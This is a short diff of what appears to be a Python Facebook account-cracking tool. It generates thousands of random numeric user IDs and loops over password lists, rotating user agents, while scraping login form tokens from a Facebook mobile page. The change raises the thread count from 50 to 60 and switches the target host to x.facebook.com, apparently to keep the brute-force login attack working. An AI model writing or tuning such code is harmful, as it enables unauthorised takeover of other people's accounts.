@@ -207,7 +207,7 @@ def BIPUL():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as ahare:
+    with ThreadPool(max_workers=60) as ahare:
         clear()
         tl = str(len(user))
         print('\033[1;32m [❤️] Choice Code: '+code)
@@ -233,7 +233,7 @@ def mumitx(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
